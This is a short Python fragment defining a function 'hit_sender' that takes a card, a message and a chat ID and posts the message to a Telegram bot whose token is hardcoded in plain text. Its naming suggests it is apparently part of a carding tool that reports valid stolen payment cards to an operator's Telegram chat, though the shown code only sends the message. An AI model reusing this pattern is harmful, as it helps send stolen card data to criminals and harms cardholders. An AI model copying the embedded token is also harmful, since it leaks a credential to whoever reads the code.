import requests

def hit_sender(card,message,chat_id):
    bot_token = '6076763989:AAEw6e6E3wff3L7iBRlA5HDoOuMnVBi-cWE'
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    requests.post(url, data=data)
